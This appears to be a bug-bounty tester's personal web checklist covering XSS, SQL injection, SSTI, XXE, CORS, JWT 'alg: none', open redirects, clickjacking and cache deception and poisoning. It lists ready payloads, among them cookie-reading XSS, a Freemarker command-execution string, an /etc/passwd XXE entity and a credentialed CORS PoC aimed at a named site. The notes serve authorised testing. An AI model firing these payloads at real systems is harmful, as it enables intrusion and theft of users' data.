@@ -1,0 +1,533 @@
+--- Web Test Case ----
+
+Web CheckList:
+https://pentestbook.six2dez.com/others/web-checklist
+
+Cheat Sheet for Common bug For Bug Bounty hunter:
+https://github.com/tcrsecurity/Cheat-for-common-bugs-for-Bug-Bounty-Hunting/blob/main/Cheat%20Sheet%20for%20Common%20bug%20For%20Bug%20Bounty%20hunter
+
+Offensive-Payloads:
+https://github.com/InfoSecWarrior/Offensive-Payloads/tree/main
+
+
+burp advance scope: .*\.targetdomain\.com
+
+CVSS score:
+https://chatgpt.com/c/680356ef-8e88-8001-91b6-2d62c6b7ccb0
+https://www.first.org/cvss/calculator/3-1#
+
+Web security Research paper:
+https://portswigger.net/research/articles
+
+Bugcrowd Research paper:
+site:bugcrowd.com inurl:disclosures
+
+--------
+
+
+1. HTML Injection:
+<h1>test</h1>
+"><h1>test</h1>
+<h1 style="color:black;">Hacked by TEST</h1>
+
+
+2. Open Redirection (GET Based)
+//evil.com
+https://evil.com
+/%5C%5Cevil.com
+https://victim.com@evil.com
+
+
+
+3. XSS (Cross site scripting):
+
+<script>alert(1)</script>
+"><script>alert(1)</script>
+"><script>alert(document.cookie)</script>
+<a onmouseover="alert('Hi!')">HOVER ME</a>
+<svg/onload=alert(1)
+
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src="https://evil.com" onload="alert('XSS')"></iframe>
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+
+<img src="x" onerror="alert('XSS')">    
+"><img src="x" onerror="alert('XSS')"> 
+<img src="x" onerror="alert(document.cookie)">
+"><img Src="abc" Onerror="alert(document.cookie)">
+------
+
+4. Username Enumeration (Non-Brute force)
+
+
+5. Exif Geolocation not stripped from uploaded image
+https://exifmeta.com/
+
+
+6. Weak Registration and Login implementation (HTTP)
+
+7. Failure to Invalid Session ( after Password Change/reset) - [Session Management]
+Steps:
+1.Use credential to login successfully & again use same Credentials to login another browser
+2.After successfully login firefox and chrome with same Credentials
+3.Change the password/Reset the password in firefox browser 
+4.After successfully change the password in firefox Refrase the Chrome browser
+5.We you are not logOut it's vulnerable to Session Management vulnerability
+
+
+8. Web application firewall (WAF) Bypass (Access through IP)
+Use shodan.io
+
+9. Misconfigured DNS (Zone Transfer)
+
+10. Using Default Credentials
+
+10. Sensitive Data Exposure
+
+11. Lack of Password Confirmation ( On Delete Account)
+
+
+12. CSRF (Cross Site Request Forgery):
+-Csrf occur when a attacker can trick a user to perform action on a web application where they are authenticated 
+
+In order for a CSRF attack to be possible
+- A relevant action - (like email/password change functionality)
+- Cookie based session handling 
+- No unpredictable request parameters
+
+*Where to find CSRF
+Any authenticated action which user can perform on a web application like updating email, name, address, password, send money, purchase items, delete items etc.
+
+- CSRF with no defense
+- CSRF with Request method change
+- Always try to remove the CSRF token and check for validation
+- Try to reuse the CSRF token
+- Brute force the CSRF token
+- Channing CSRF with CRLF Injection
+
+CSRF PoC Generator:
+https://hacktify.in/csrf/
+
+Csrf poc:
+https://www.youtube.com/watch?v=ShoYFNrgT44
+
+
+-----
+
+
+13. Clickjacking:
+
+Payload:
+
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<title>I Frame</title>
+</head>
+<body>
+<h3>clickjacking vulnerability</h3>
+<iframe src="https://test.ensotech.in/enso_demo/views/login/" height="600px" width="990px"></iframe>
+</body>
+</html>
+
+-----
+
+14. Host header attack (check mostly 302,301)
+
+https://freedium.cfd/https://medium.com/@it4chis3c/day-20-0f-30-days-30-vulnerabilities-host-header-injection-2745e21f7eba
+
+Host: https://evil.com
+Host: http://evil.com
+Host: localhost
+Host: 127.0.0.1
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+
+X-Forwarded-Host: google.com
+hOsT: google.com
+Host: google.com.
+Host: google.com:443
+X-Host: evil.com
+
+
+https://hackerone.com/reports/1392935
+
+---
+
+15. SQL Injections (Sqli):
+' OR '1'='1' --
+' OR '1'='1' #
+' OR 1=1 --
+" OR 1=1 --
+
+Waits for 5 seconds
+' AND IF(1=1, SLEEP(5), 0) --  
+' OR pg_sleep(5) --  
+
+sqli payload:
+https://github.com/orwagodfather/SQL-Wordlist/blob/main/sql.txt
+
+------
+
+16. File Upload:
+
+RCE via file upload
+https://medium.com/@akashoffsec/how-i-found-rce-remote-code-execution-via-file-upload-7541816e5fc4
+
+------
+
+17. CORS (Cross Orgin Resource Sharing)
+CORS vulnerabilities occur when a web application allows cross-domain requests without proper validation of the origin.
+
+Access-Control-Allow-Origin header
+Access-Control-Allow-Credentials header
+Access-Control-Allow-Methods header
+Authorization header
+
+Origin: null
+Origin: https://evil.com
+X-Original-URL: /admin
+
+cors payload:
+
+<html>
+    <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://precisetestingsolution.com/wp-json/wp/v2/users", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+    </body>
+</html>
+
+-----------
+
+
+18. IDOR (Insecure Direct Object Reference):
+- IDOR is a  type of access control vulnerability that arises when an application uses user-supplied input to access object directly.
+
+IDOR-Cheat-Sheet: https://xmind.app/m/CSKSWZ/#
+
+
+https://16521092.medium.com/some-ways-to-find-more-idor-da16c93954e5
+
+https://jasper-join-7e5.notion.site/IDOR-Cheat-Sheet-9f7c9e3285bf4c7cae5ea38243cd0391
+
+
+---------
+19. Command Injection
+
+
+20. SSTI (Server Side Template Injections)
+#{ 3 * 3 }
+#{ 7 * 7 }
+#{3*3}
+#{42*42}
+#{7*7}
+${"freemarker.template.utility.Execute"?new()("id")}
+${3*3}
+${7*7}
+${{3*3}}
+${{7*7}}
+${{<%[%'"}}%\
+*{7*7}
+
+username: ishaan%${{7*7}}
+
+
+---------
+
+21. GraphQL Api 
+
+Introspection query:
+
+{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+
+
+payload:
+query{  products{   collections{    products{     collections{      id     }    }   }  } } 
+
+
+----------
+
+22. JWT Attack (JSON web tokens (JWTs)) :
+*JSON:
+-JSON stands for JavaScript Object Notation. It's a format for exchanging data that's readable by both humans and machines
+
+what is JWTs?
+-JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems.
+-jwt are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.
+
+*JWT format 
+A JWT consists of 3 parts: a header(jwt header), a payload(jwt payload), and a signature(jwt signature). These are each separated by a dot
+
+HS256 (HMAC + SHA-256) : Symmetric [same key for both]
+RS256 (RSA + SHA-256) : Asymmetric [Use key pairs]
+
+
+jwt decoder:
+https://jwt.io/
+https://fusionauth.io/dev-tools/jwt-decoder
+
+
+**JWT Attacks
+Accepting arbitrary signature
+Accepting token with no signature
+Brute forcing secret key
+
+
+
+
+1) jwt token signature is not valid [CWE-347 - HIGH]
+Step:
+capture the jwt token & using burp json web token
+replace the "alg": "RS256" or "alg": "HS256" to "alg": "none"  
+Send the request if you get 200 ok it's a sign not valid vulnerability 
+
+Impact:
+- When a JWT (JSON Web Token) signature is not validated, it allows attackers to forge or tamper with tokens without detection. The signature ensures the token's integrity and authenticity, verifying it was issued by a trusted source.
+
+
+
+-------------
+
+23. SSRF (Server Side Request Forgery):
+
+
+
+----
+
+24. XXE (XML External Entities):
+
+What is XML?
+-XML presents a useful resource for sending data from service to service and for data processing internally but with anything, as soon as user input gets involved, things get dangerous. The processing of these files comes with an inherent risk due to XML processors having external entities enabled by default. Not everyone knows about these settings which makes this a potentially dangerous thing to have. External entities can be used to grab files or even execute code.
+
+[Including XXE cheatsheet]
+https://medium.com/@bdemir/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16 
+
+payload:
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+after Inserting the payload you have to call it without calling it's not working
+
+- External calling
+&xxe;   --> [calling using "&" and "name of your entity his its 'xxe'"] 
+
+- Internal calling
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+%xxe;
+]>
+
+Exploit/Chain in XXE
+1. XXE to LFI (Local file Inclusion)
+2. Blind XXE Detection
+3. XXE to SSRF
+4. XXE to exfiltrate data using a malicious external DTD
+
+
+
+
+-----
+
+
+25. Oauth Authentication
+
+
+26. Path Traversal (Directory Traveral):
+
+
+27. Web Cache Deception
+
+*Research paper:
+https://portswigger.net/research/gotta-cache-em-all
+
+- linkedin post views:
+an endpoint [/account/pilling] was safe from cache deception [cf_cach: dynamic]
+But this endpoint when I add [/account/pilling/anything] to it it gives me the same page and the other endpoint redirected me to the home page
+So I tried adding [/anything.css] and look for anything new
+I found that the page disappeared and a 3 second counter appeared to return to the home page (Like all pages)
+I found that this page is cached and when I open it from another browser it shows me the 3 second timer to take me back to the login page
+So I decided to open the source code of the page before the end of the three seconds and redirect me to the login page.
+As I expected, I found all my information stored in JavaScript code and cached.
+var USER_INFO={id:XX,email:xxx@xxx , name:xxx, Payment_details : XXXX, more.........}
+
+Note: Web Cache Deception attack work when cache are there
+
+In order to exploit WCD(Web Cache Deception) vulnerabilities we need to craft a url that satisfies two properties:
+
+1.The url must be interpreted by the web server as a request for a non-cacheable page and should trigger a successful response.
+
+2.The same url must be interpreted by an intermediate web cache as a request for a static object matching the caching rule.
+
+**Four Techniques for path confusion:
+
+1.Path Parameter : 
+GET /account.php/style.css
+
+2.Encoded New Line(\n) :
+GET /account.php%0Astyle.css
+
+3.Encoded Simicolon(;) :
+GET /account.php%3Bstyle.css
+
+4.Encoded Pound(#) :
+GET /account.php%23style.css
+
+5.Encoded Question Mark (?) :
+GET /account.php%3Fvar=style.css
+
+
+5.1.Recently. I have read a great path confusion writeup but I don’t remember where.However, The bug hunter observer that the website has a caching rule like this
+
+/blog/*
+
+And he exploit that by sending this kind of request.
+
+GET /blog/%2F../account.php
+
+
+----
+
+28. DRY principle while registering a user
+- The DRY (Don't Repeat Yourself) principle means writing a piece of code only once and reusing it whenever needed instead of copying and pasting the same logic multiple times.
+
+
+
+
+29. HTTP request smuggling
+-HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
+- HTTP request smuggling is also called as HTTP DESYNC ATTACK
+
+payload:
+Transfer-Encoding: chunked
+
+b
+q=smuggling
+
+0
+
+
+
+30. Prototype pollution:
+- Prototype Pollution is a type of vulnerability that arises when an attacker can manipulate or inject properties into the prototype of object.
+- This vulnerability occurs when user supplied input is not properly handled/sanitized resulting in modifying the properties of an object.
+
+
+**Identify the prototype pollution
+
+Object.prototype.polluted = "hacked!";
+alert({}.polluted);  // If it shows "hacked!", then prototype modification is possible
+
+
+var payload = { "__proto__": { "polluted": "true" } };
+Object.assign({}, payload);
+alert({}.polluted);  // Should show "true" if vulnerable
+
+console.log({}.hasOwnProperty('polluted'));  // If false, property is inherited (polluted)
+
+-----
+
+31. Cache Poisoning
+
+video: https://www.youtube.com/watch?v=j2RrmNxJZ5c
+
+https://youst.in/posts/cache-poisoning-at-scale/
+
+https://portswigger.net/research/practical-web-cache-poisoning
+
+1.1 CPDOS due to Misconfig
+- CPDOS due to Misconfig" sounds like a shorthand for "Cache Poisoned Denial of Service due to Misconfiguration.
+
+1.2 Cache Poison DOSS or ... domains by adding invalid character defined in RFC7230 (/) in the request
+
+
+Caching an invalid 400 response by sending an invalid header defined in the RFC7230 like /
+
+HTTP Caching RFC 7231
+
+-From Novice to Ninja: Unraveling Bug Bounty Beginnings through Cache Poisoning:
+https://cametom006.medium.com/from-novice-to-ninja-unraveling-bug-bounty-beginnings-through-cache-poisoning-40de3f8fd211
+
+
+-DoS and BugBounties :A series of DoS attacks on HackerOne
+https://medium.com/@NinadMishra/dos-and-bugbounties-a-series-of-dos-attacks-on-hackerone-9c8316e192c9
+
+-CPDoS: Cache Poisoned Denial of Service
+https://cpdos.org/
+
+
+-Cache Poisoning at Scale (Identifying and Exploiting over 70 Cache Poisoning vulnerabilities)
+https://youst.in/posts/cache-poisoning-at-scale/
+
+-Don’t Trust the Cache: Exposing Web Cache Poisoning and Deception vulnerabilities
+https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52
+
+
+--
+Web Cache Poisoning
+- It is a technique where attacker tricks a web server into storing harmful or incorrect information in it's cache memory.
+
+- In web cache poisoning, the attacker tries to make the server store malicious data, so when someone visits the website, they are served that malicious data
+
+Possible Attacks
+1. Content Spoofing:
+An attacker can manipulate the cached content to display incorrect or malicious information to website visitors.
+
+2. Session Hijacking: By poisoning the cache, an attacker can gain unauthorized access to user sessions. They can tamper with session tokens or cookies stored in the cache, allowing them to impersonate legitimate users and perform malicious actions on their behalf.
+
+3. Cross-Site Scripting (XSS): Web cache poisoning can be used to inject malicious scripts into the cache, which are then served to multiple users visiting the website.
+
+
+find web cache posing vulnerability 
+1. Look for a page which is being cached.
+2. Look for unkeyed input in the request (Using tools like Param Miner)
+3. Inject the payload into the unkeyed input at the same time that the cache refreshes
+
+
+For automation:
+tool : toxicache
+by : xhzeem GitHub
+
+For manually:
+use : Param Miner burpsuite extension
+
+
+Step to reproduce:
+1. If you see this thing in response Cache-Control: max-age=30, Age: 1, X-Cache: hit 
+2. you can use Param Miner burpsuite extension -> right click and select extension -> guess header
+3. Check the response: Extension tab -> select Param Miner -> Output
+4. After successfully identify vulnerable header
+5. you can use cache buster /?cb=ishaan123 {it's optional you can write anything you want after this /?}
+Note: Use cache buster to prevent DOS attack so legit user don't affect
+
+6. you can add payload and send request and when you refresh the page your payload is trigger but if you are using cache buster so in the end of url like https://therubmind.com/?cb=ishaan123 then it trigger
+
+--
+
+
+paylaod unkeyed : 
+a./"><script>alert(1)</script>
+a"><script>alert(1)</script>
+
+X-Original-URL: /admin
+
+
+
+
+
+
